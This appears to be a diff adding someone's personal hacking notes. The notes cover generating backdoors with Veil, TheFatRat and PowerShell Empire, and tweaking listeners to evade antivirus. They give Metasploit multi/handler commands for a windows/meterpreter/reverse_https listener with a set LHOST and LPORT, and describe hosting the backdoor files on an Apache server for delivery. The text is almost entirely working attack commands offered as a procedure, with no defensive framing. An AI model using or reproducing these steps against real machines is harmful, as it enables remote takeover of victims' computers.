@@ -1,0 +1,42 @@
+NOTE: if a listerner is detected by many antivirus programs then tweeek with its options
+and check on is
+
+*** Generating Backdoors ***
+METHOD 1: Using Veil Framework	(Use metasploit to generate Backdoors)
+
+
+METHOD 2: Using Fat Rat Framework	(Use metasploit to generate Backdoors)
+
+
+METHOD 3: Using Empire	(Use powershell to generate Backdoors)
+
+// Step1: Install Dependencies
+    apt-get update
+    apt-get install powershell-empire
+
+// Step2:
+    powershell-empire server // start server in terminal 1 and split that terminal
+    powershell-empire client
+
+    // in client section type "help" to list all options
+    // 1. Start A listerner "uselistener"
+    // 2. Generate backdoor
+
+
+*** Listening to incomming connection ***
+
+msfconsole
+use exploit/multi/handler
+show options
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 10.20.14.213		// see from ifconfig command (This is ip where we will receive connection)
+set LPORT 8080
+save			// run this command so that multi handler remembers all these details
+show options 	// check if everything is fine
+exploit
+
+
+
+*** Starting Apache Server ***
+service apache2 start
+/var/www/html/		// paste your backdoor files here
